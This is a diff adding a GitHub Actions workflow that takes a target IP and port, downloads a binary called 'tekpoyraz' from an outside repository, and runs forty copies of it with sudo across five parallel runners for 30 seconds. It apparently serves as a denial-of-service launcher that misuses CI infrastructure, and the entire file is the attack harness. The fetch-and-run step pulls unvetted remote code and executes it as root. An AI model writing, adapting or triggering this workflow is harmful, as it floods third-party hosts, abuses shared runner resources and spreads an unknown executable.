@@ -1,0 +1,48 @@
+name: Tekil !
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: "IP !"
+        required: true
+        default: "127.0.0.1"
+      port:
+        description: "Port !"
+        required: true
+        default: "53"
+      
+jobs:
+  vds:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 5
+      matrix:
+        instance: [1,2,3,4,5]
+
+    steps:
+      - name: Checkout (optional)
+        uses: actions/checkout@v4
+
+      - name: OK !
+        run: |
+          TARGET="${{ inputs.target }}"
+          PORT="${{ inputs.port }}"
+          
+          wget https://github.com/Paraloxd/tekpoyraz/raw/refs/heads/main/tekpoyraz -O Tekil
+          chmod +x Tekil || true
+
+          PIDS=()
+          for i in {1..8}; do
+            sudo timeout 30 ./Tekil "$TARGET" "$PORT" &
+            PIDS+=($!)
+          done
+
+          for pid in "${PIDS[@]}"; do
+            wait $pid
+          done
+
+      - name: Finish !
+        run: |
+          sleep 30
+          exit 0
